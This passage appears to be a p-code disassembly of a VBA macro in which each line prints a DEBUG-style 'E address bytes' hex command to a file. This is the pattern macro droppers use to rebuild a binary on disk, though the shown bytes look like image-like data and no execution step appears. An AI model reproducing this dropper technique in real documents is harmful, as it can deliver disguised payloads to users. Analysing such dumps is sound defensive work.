' 	LitStr 0x0036 "E C8F0 B6 C5 D5 C8 D7 E7 C1 CF E1 AE BC CE 8E 9C AF 79"
' 	PrintItemNL 
' Line #3410:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C900 87 99 BF CF DF C1 D4 E1 AF C2 CF B5 C9 D4 B6 C8"
' 	PrintItemNL 
' Line #3411:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C910 D3 B5 C7 D2 BA CA D7 8F 9E AE 62 6F 7F 6F 7C 8C"
' 	PrintItemNL 
' Line #3412:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C920 86 93 A3 7A 85 93 60 6C 78 66 73 7B 75 83 89 7F"
' 	PrintItemNL 
' Line #3413:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C930 8B 91 85 8C 95 94 99 A2 90 98 9F 8D 95 9C 89 92"
' 	PrintItemNL 
' Line #3414:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C940 96 82 8B 8E 9E A7 AA D2 DC DC ED F7 F7 D3 DD DD"
' 	PrintItemNL 
' Line #3415:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C950 C6 D0 D0 D9 E3 E3 DC E5 E8 CF D8 DB D8 DF E2 DB"
' 	PrintItemNL 
' Line #3416:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C960 E4 E8 BB C5 CC 81 8A 93 7C 83 8C 7F 84 8D 75 7A"
' 	PrintItemNL 
' Line #3417:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C970 83 00 00 07 00 00 F5 F4 F0 EC EB E7 DF E0 DE CE"
' 	PrintItemNL 
' Line #3418:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C980 D1 CF BE C3 C2 B7 BC BD 00 01 04 CD D6 DA BD C8"
' 	PrintItemNL 
' Line #3419:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C990 CC A8 B4 BA A1 AC B4 9F A9 B3 A6 B0 BA A1 AA B7"
' 	PrintItemNL 
' Line #3420:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C9A0 9C A5 B2 A2 AE BA EB F7 FF A5 B3 BF 65 75 81 8C"
' 	PrintItemNL 
' Line #3421:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C9B0 9C A8 A1 B1 BD AC BC C8 AF BB C7 AC B8 C4 9E A7"
' 	PrintItemNL 
' Line #3422:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C9C0 B4 96 9F AC 95 9E AB A2 AB B8 93 9F AB 73 83 8F"
' 	PrintItemNL 
' Line #3423:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C9D0 6A 7C 87 63 76 7E 7B 88 90 9C A7 AF A9 B3 BD D5"
' 	PrintItemNL 
' Line #3424:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C9E0 E1 EB DF EB F5 D3 DF EB CD DB E7 C6 D3 E1 B4 C3"
' 	PrintItemNL 
' Line #3425:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C9F0 D3 79 89 99 69 79 8A 8F A1 B2 B1 C2 D5 B2 C6 D8"
' 	PrintItemNL 
' Line #3426:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E CA00 96 A9 BE 71 82 95 5F 6D 80 42 4D 61 31 3C 50 30"
' 	PrintItemNL 
' Line #3427:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E CA10 3B 4F 35 40 56 37 42 58 36 41 57 42 4D 63 56 60"
' 	PrintItemNL 
' Line #3428:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E CA20 78 7D 87 9F 83 8D A5 6A 74 8C 75 7F 97 9A A4 BC"
' 	PrintItemNL 
' Line #3429:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E CA30 93 9C B7 6A 73 8E 58 62 7A 4F 59 71 54 5F 75 66"
' 	PrintItemNL 
' Line #3430:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E CA40 71 85 67 72 86 5D 69 7B 69 76 86 85 92 A2 AC B9"
' 	PrintItemNL 
' Line #3431:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E CA50 C7 C7 D4 E2 CB D8 E6 BF CC DA AA B7 C7 77 84 94"
' 	PrintItemNL 
' Line #3432:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E CA60 75 82 92 C2 D1 E1 C0 D0 E0 A8 B9 C6 BC CD DA CE"
' 	PrintItemNL 
' Line #3433:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E CA70 E0 EB BC CE D9 AB BD C8 93 A4 B1 76 86 96 77 85"
' 	PrintItemNL 
' Line #3434:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E CA80 97 7B 89 9C 86 94 A7 79 85 97 63 70 80 5C 69 77"
' 	PrintItemNL 
' Line #3435:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E CA90 5D 6B 77 6C 78 82 72 7B 84 82 89 92 84 8A 91 86"
' 	PrintItemNL 
' Line #3436:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E CAA0 8C 93 93 99 9E 89 90 93 84 8B 8E 9E A6 A6 E7 EF"
' 	PrintItemNL 
' Line #3437:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E CAB0 EF EF F7 F7 D9 E1 E1 CF D7 D7 E0 E7 EA EA F1 F4"
' 	PrintItemNL 
' Line #3438:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E CAC0 E7 F0 F3 DC E5 E9 A0 AA B1 7B 84 8D 79 80 89 6A"
' 	PrintItemNL 
' Line #3439:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E CAD0 6F 78 61 66 6F 00 00 07 00 00 FC FB F7 EF F0 EC"
' 	PrintItemNL 
' Line #3440:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E CAE0 E2 E3 E1 CE D1 CF BF C4 C3 B4 B9 B8 00 00 01 CC"
' 	PrintItemNL 
' Line #3441:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E CAF0 D3 D6 EF F8 FB CE D9 DD C0 CA D1 B5 C0 C8 D0 DB"
' 	PrintItemNL 
' Line #3442:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E CB00 E3 CB D5 DF B8 C2 CC 9A A4 AE C0 CE DA 81 8F 9B"
' 	PrintItemNL 
' Line #3443:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E CB10 5D 6D 79 89 99 A5 A9 B9 C5 AA B8 C4 AD B9 C5 C6"
' 	PrintItemNL 
' Line #3444:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E CB20 D2 DE C4 CD DA AA B3 C0 C1 CA D7 C7 D3 DF 81 8F"
' 	PrintItemNL 
' Line #3445:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E CB30 9B 68 78 84 80 92 9D 69 7A 83 A3 AF B5 A1 AB B2"
' 	PrintItemNL 
' Line #3446:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E CB40 8D 97 9E BE C9 D1 DE E9 F1 E1 ED F7 DF EE F7 C9"
' 	PrintItemNL 
' Line #3447:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E CB50 D9 E5 C9 D9 E6 C8 D8 E8 A1 B4 C3 6B 7F 90 66 7A"
' 	PrintItemNL 
' Line #3448:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E CB60 8C 8B A1 B3 A8 BD D2 AD C0 D5 A0 AE C1 80 8B 9F"
' 	PrintItemNL 
' Line #3449:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E CB70 67 72 86 57 62 76 41 4C 62 2E 39 4F 39 44 5A 59"
' 	PrintItemNL 
' Line #3450:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E CB80 64 7A 45 4F 67 58 62 7A 58 62 7A 51 5B 73 63 6D"
' 	PrintItemNL 
' Line #3451:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E CB90 85 7B 85 9D 74 7D 98 5C 65 80 51 5B 73 57 61 79"
' 	PrintItemNL 
' Line #3452:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E CBA0 53 5D 75 50 5B 71 5F 6A 7E 80 8C 9E A5 B1 C3 C0"
' 	PrintItemNL 
' Line #3453:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E CBB0 CD DD C3 D0 E0 C3 D0 DE B2 BF CD 8C 99 A7 60 6D"
' 	PrintItemNL 
' Line #3454:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E CBC0 7B 80 8D 9B C6 D3 E1 BF CF DC 9C AB BB BB CB DB"
' 	PrintItemNL 
' Line #3455:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E CBD0 E6 F6 FF C6 D7 E4 A0 B2 BD 9A AB B8 88 98 A8 8D"
' 	PrintItemNL 
' Line #3456:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E CBE0 9D AE 81 8F A2 85 92 A8 87 94 AA 81 8F A5 7E 8C"
' 	PrintItemNL 
' Line #3457:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E CBF0 9F 6F 7F 90 59 68 78 4F 5C 6A 53 5D 67 62 69 72"
' 	PrintItemNL 
' Line #3458:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E CC00 7C 83 8C 8B 93 9A 92 98 9F 8F 95 9A 80 87 8A 77"
' 	PrintItemNL 
' Line #3459:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E CC10 7F 7F B5 BC BF F4 FC FC F0 F7 FA D4 DD E0 DB E2"
' 	PrintItemNL 
' Line #3460:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E CC20 E5 CB D4 D8 A4 AD B1 85 90 94 7B 87 8D 7E 88 8F"
' 	PrintItemNL 
' Line #3461:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E CC30 8E 96 9D 87 8D 94 7D 83 8A 01 07 0E 00 00 F7 F8"
' 	PrintItemNL 
' Line #3462:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E CC40 F4 EA EB E7 DE DF DB CE D2 CD C2 C7 C5 B5 BA B9"
' 	PrintItemNL 
' Line #3463:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E CC50 00 01 00 E4 EC EC F5 FE FF F4 FF FF D4 DF E3 AC"
' 	PrintItemNL 
' Line #3464:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E CC60 B6 BD E9 F3 FA DA E3 EC C4 CD D6 C2 CD D5 A1 B0"
' 	PrintItemNL 
' Line #3465:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E CC70 B9 5C 6C 78 7A 88 94 A5 B3 BF 9E AC B8 8A 98 A4"
' 	PrintItemNL 
' Line #3466:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E CC80 9C A8 B4 B8 C4 D0 9F A8 B5 A7 B0 BD D2 DE EA C0"
' 	PrintItemNL 
' Line #3467:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E CC90 CC D8 75 83 8F 99 A9 B5 C7 D9 E4 7C 8D 96 D0 DC"
' 	PrintItemNL 
' Line #3468:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E CCA0 E2 DC E7 EB BF CA CE CC D8 DC C3 CF D5 C1 CE D6"
' 	PrintItemNL 
' Line #3469:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E CCB0 E4 F4 FB EA FB FF D3 E3 EF CA DB E8 C1 D4 E3 B8"
' 	PrintItemNL 
' Line #3470:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E CCC0 CC DD 97 AB BD 5E 74 86 52 68 7A 71 87 99 85 94"
' 	PrintItemNL 
' Line #3471:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E CCD0 A7 94 A2 B5 98 A6 B9 84 92 A5 69 77 8A 55 63 76"
' 	PrintItemNL 
' Line #3472:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E CCE0 47 54 6A 3E 4B 61 3C 49 5F 38 45 5B 35 41 59 3E"
' 	PrintItemNL 
' Line #3473:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E CCF0 4A 62 4D 59 71 53 5F 77 5C 67 82 6D 78 93 76 81"
' 	PrintItemNL 
' Line #3474:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E CD00 9C 76 82 9A 79 85 9D 8A 97 AD A1 AE C4 AC BA CD"
' 	PrintItemNL 
' Line #3475:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E CD10 B4 C2 D4 C1 D0 E0 AD BC CC 94 A3 B3 6D 7D 8A 4B"
' 	PrintItemNL 
' Line #3476:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E CD20 5B 68 7F 8F 9B CA DA E6 BD CD D9 98 A8 B5 C9 D8"
' 	PrintItemNL 
' Line #3477:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E CD30 E8 E5 F4 FF D6 E3 F1 99 A9 B6 86 96 A2 8E 9E AB"
' 	PrintItemNL 
' Line #3478:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E CD40 84 93 A3 85 93 A5 8C 9A B0 90 9E B5 88 95 AF 7F"
' 	PrintItemNL 
' Line #3479:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E CD50 8E A8 81 8F A6 7A 8B A0 72 81 94 69 77 89 47 52"
' 	PrintItemNL 
' Line #3480:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E CD60 60 5A 63 6D 7D 86 90 8A 93 9C 8A 91 9A 91 99 A0"
' 	PrintItemNL 
' Line #3481:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E CD70 8E 97 9B 86 8F 92 77 80 84 B6 BF C2 E2 EB EF EA"
' 	PrintItemNL 
' Line #3482:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E CD80 F5 F9 D9 E2 E6 AD B7 BE 86 90 97 67 73 79 7E 8A"
' 	PrintItemNL 
' Line #3483:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E CD90 8E 83 8E 92 87 8D 92 84 88 8D 7E 82 87 00 02 07"
' 	PrintItemNL 
' Line #3484:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E CDA0 00 00 F9 FA F6 E9 EA E6 DB DF DA D0 D4 CF C3 C8"
' 	PrintItemNL 
' Line #3485:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E CDB0 C6 B3 B8 B6 00 02 01 F8 FE FD EF F7 F7 F6 FF FF"
' 	PrintItemNL 
' Line #3486:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E CDC0 ED F6 FA A5 B0 B4 BD C8 CC AD B7 BE CE D8 DF F3"
' 	PrintItemNL 
' Line #3487:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E CDD0 FF FF 9E AD B6 52 63 6C B5 C3 CF EA F9 FF B2 C0"
' 	PrintItemNL 
' Line #3488:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E CDE0 CC 91 9D A7 B1 BD C9 BC C6 D0 7F 88 95 A8 B2 BC"
' 	PrintItemNL 
' Line #3489:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E CDF0 DC E8 F4 B6 C2 CC 76 84 90 C6 D5 DE ED FD FF 82"
' 	PrintItemNL 
' Line #3490:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E CE00 92 99 E9 F4 F8 F1 FA FD DF E8 EB F4 FF FF C7 D2"
' 	PrintItemNL 
' Line #3491:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E CE10 D6 8F 9B A1 B3 C1 C7 DD ED F4 E1 F2 FB E1 F3 FE"
' 	PrintItemNL 
' Line #3492:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E CE20 D9 EC F9 CA DF EE C5 D9 EA BD D3 E5 9A B0 C2 6A"
' 	PrintItemNL 
' Line #3493:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E CE30 80 92 57 66 79 4A 58 6B 4B 59 6C 5B 69 7C 57 65"
' 	PrintItemNL 
' Line #3494:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E CE40 78 3E 4C 5F 30 3D 53 34 41 57 3D 4A 60 4A 57 6D"
' 	PrintItemNL 
' Line #3495:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E CE50 43 4F 67 2D 39 51 24 30 48 2E 3A 52 46 52 6A 61"
' 	PrintItemNL 
' Line #3496:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E CE60 6C 87 77 82 9D 7E 89 A4 85 91 A9 93 9F B7 9D A9"
' 	PrintItemNL 
' Line #3497:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E CE70 C1 93 A0 B6 8A 98 AB 91 9F B1 6F 7D 8F 6A 79 89"
' 	PrintItemNL 
' Line #3498:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E CE80 6E 7D 8D A4 B4 C1 C7 D7 E4 A8 B8 C4 AB BB C7 E0"
' 	PrintItemNL 
' Line #3499:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E CE90 F0 FC EF FC FF DC E9 F9 9E AB B9 83 90 9E 84 92"
' 	PrintItemNL 
' Line #3500:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E CEA0 9E 7A 8A 97 88 97 A7 9A A8 BA 9E AC C2 91 9F B6"
' 	PrintItemNL 
' Line #3501:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E CEB0 84 93 AD 90 9E BA 8F 9E B8 7C 8B A5 7C 8C A3 83"
' 	PrintItemNL 
' Line #3502:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E CEC0 92 A5 78 85 95 85 91 9D 90 99 A6 86 90 9A 87 90"
' 	PrintItemNL 
' Line #3503:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E CED0 9A 8C 95 9E 88 90 97 90 98 9F 88 90 97 83 8D 94"
' 	PrintItemNL 
' Line #3504:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E CEE0 AF B9 C0 CE D8 DF 97 A2 AA 6F 7A 82 7C 87 8F 74"
' 	PrintItemNL 
' Line #3505:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E CEF0 81 89 72 7E 82 76 82 84 77 7E 81 85 8A 8D 83 88"
' 	PrintItemNL 
' Line #3506:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E CF00 8B 00 00 03 00 00 F7 FB F6 EA EE E9 DF E2 E0 D3"
' 	PrintItemNL 
' Line #3507:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E CF10 D6 D4 BC C1 BF B2 B7 B5 00 01 00 FA FF FF F9 FE"
' 	PrintItemNL 
' Line #3508:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E CF20 FF F8 FF FF E3 EA ED 92 9B 9E AF B8 BB F2 FB FF"
' 	PrintItemNL 
' Line #3509:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E CF30 D9 E4 E8 C7 D3 D9 6F 7F 86 6C 7E 85 D7 E6 EF DB"
' 	PrintItemNL 
' Line #3510:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E CF40 E8 F0 DC E8 F2 E6 F1 F9 E1 EB F5 D6 DF E8 C0 C9"
' 	PrintItemNL 
' Line #3511:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E CF50 D3 AC B7 BF C7 D3 DD 91 9E A6 88 94 9E E5 F5 FC"
' 	PrintItemNL 
' Line #3512:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E CF60 E0 EF F8 7E 8C 92 9B A7 A9 D5 DF DF F2 FC FC F4"
' 	PrintItemNL 
' Line #3513:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E CF70 FF FF E6 F2 F4 99 A5 A9 AA B8 BE D5 E5 EC DD EE"
' 	PrintItemNL 
' Line #3514:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E CF80 F7 D5 E7 F2 E8 FB FF D3 E8 F7 D2 E7 F6 DF F6 FF"
' 	PrintItemNL 
' Line #3515:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E CF90 DC F3 FF CF E3 F4 C2 D4 E5 B7 C7 D8 A9 B9 CA 9F"
' 	PrintItemNL 
' Line #3516:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E CFA0 AF C0 91 A1 B2 80 90 A1 71 80 93 6B 7A 8D 5F 6E"
' 	PrintItemNL 
' Line #3517:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E CFB0 81 42 51 64 2B 39 4F 30 3E 54 42 50 66 4B 59 6F"
' 	PrintItemNL 
' Line #3518:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E CFC0 4A 58 6E 48 56 6D 5A 67 81 65 72 8C 56 63 7D 50"
' 	PrintItemNL 
' Line #3519:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E CFD0 5E 75 67 75 8C 69 77 8D 55 63 79 52 61 74 5D 6C"
' 	PrintItemNL 
' Line #3520:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E CFE0 7F 8E 9E AF AE BE CE AE BF CC A4 B5 C2 BA CB D8"
' 	PrintItemNL 
' Line #3521:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E CFF0 E0 F2 FD E7 F7 FF C1 CE DE 95 9F B0 9F AA B8 9C"
' 	PrintItemNL 
' Line #3522:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D000 AA B6 90 9E AA 9B A8 B6 92 A1 B1 91 9F B1 89 97"
' 	PrintItemNL 
' Line #3523:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D010 AD 8E 9C B3 8D 9C B6 96 A4 C0 8E 9C B8 7B 8A A4"
' 	PrintItemNL 
' Line #3524:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D020 79 8A A4 7A 8B A0 88 96 A8 8D 9A AA 8E 98 A9 8F"
' 	PrintItemNL 
' Line #3525:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D030 9A A8 A7 B0 BD A8 B2 BC 8E 97 A1 8B 94 9D 88 91"
' 	PrintItemNL 
' Line #3526:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D040 9A 7B 84 8D 8B 94 9D 84 8F 97 68 74 7E 6B 7A 83"
' 	PrintItemNL 
' Line #3527:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D050 76 85 8E 77 87 8E 86 92 96 86 8F 92 8B 90 93 9D"
' 	PrintItemNL 
' Line #3528:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D060 A0 A4 98 9B 9F 00 00 03 00 00 ED F1 EC F7 FB F6"
' 	PrintItemNL 
' Line #3529:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D070 E0 E3 E1 CE D1 CF BF C4 C2 B6 BB B9 00 05 04 FB"
' 	PrintItemNL 
' Line #3530:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D080 FF FF FB FF FF F5 FA FB F3 F8 FB C4 CB CE 8F 96"
' 	PrintItemNL 
' Line #3531:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D090 99 BC C5 C8 CD D6 DA F0 FC FF 91 A1 A7 8D 9D A4"
' 	PrintItemNL 
' Line #3532:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D0A0 E9 F6 FE E6 F1 F9 E2 ED F5 F1 FA FF EE F5 FE CB"
' 	PrintItemNL 
' Line #3533:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D0B0 D2 DB A7 B0 B9 D5 DE E7 EC F7 FF B0 BD C5 DC E9"
' 	PrintItemNL 
' Line #3534:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D0C0 F1 ED FA FF CE DB E3 6B 77 7D 82 8C 8C EB F3 F2"
' 	PrintItemNL 
' Line #3535:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D0D0 F8 FF FF F6 FF FF E3 EC EF A2 AE B0 DE EA EE ED"
' 	PrintItemNL 
' Line #3536:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D0E0 FB FF D6 E6 ED B9 CA D3 D5 E7 F2 DE F2 FD D7 EA"
' 	PrintItemNL 
' Line #3537:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D0F0 F7 CE E4 F0 C8 DD EC C6 DB EA D1 E1 F1 C5 D5 E5"
' 	PrintItemNL 
' Line #3538:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D100 B8 C8 D9 AF BF CF A0 B0 C1 86 96 A7 68 78 89 55"
' 	PrintItemNL 
' Line #3539:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D110 65 76 31 40 53 37 46 59 47 56 69 59 68 7B 5B 69"
' 	PrintItemNL 
' Line #3540:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D120 7F 53 61 77 4F 5D 73 53 61 77 45 53 6A 50 5E 75"
' 	PrintItemNL 
' Line #3541:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D130 50 5E 75 4C 5A 71 52 60 77 5D 6B 82 72 80 96 8C"
' 	PrintItemNL 
' Line #3542:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D140 9A B0 A2 B1 C4 A4 B4 C5 A3 B3 C4 B5 C5 D5 D0 E1"
' 	PrintItemNL 
' Line #3543:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D150 EE E5 F6 FF DD EF FA B6 C6 D2 8B 96 A4 91 9C AA"
' 	PrintItemNL 
' Line #3544:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E D160 8A 96 A2 86 92 9E 96 A2 AE 99 A7 B3 92 9F AD 90"
' 	PrintItemNL 
' Line #3545:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
